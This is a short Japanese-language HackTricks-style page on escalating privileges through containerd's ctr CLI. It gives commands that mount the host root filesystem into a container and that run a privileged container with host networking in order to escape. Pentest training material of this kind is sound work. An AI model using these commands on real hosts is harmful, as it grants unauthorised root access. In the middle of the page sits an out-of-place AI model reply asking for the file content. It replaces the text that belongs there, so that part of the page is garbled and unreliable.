# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

次のリンクを参照して、**`containerd` と `ctr` がコンテナスタックのどこに位置するか** を確認してください：


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

ホストに `ctr` コマンドが存在することが分かった場合：
```bash
which ctr
/usr/bin/ctr
```
I don't have the file content. Do you mean:

- list image files embedded in src/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation.md, or
- list container images referenced in that document?

Please paste the markdown (or the relevant section) or confirm which type you mean, and I'll list the images.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
そして **ホストのルートフォルダをマウントしてそのイメージの一つを実行します**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

privilegedなcontainerを実行して、そこからescapeする。\
privileged containerは次のように実行できます:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
次に、以下のページで述べられているいくつかのテクニックを使用して、**特権付きcapabilitiesを悪用してそこから脱出できます**:

{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
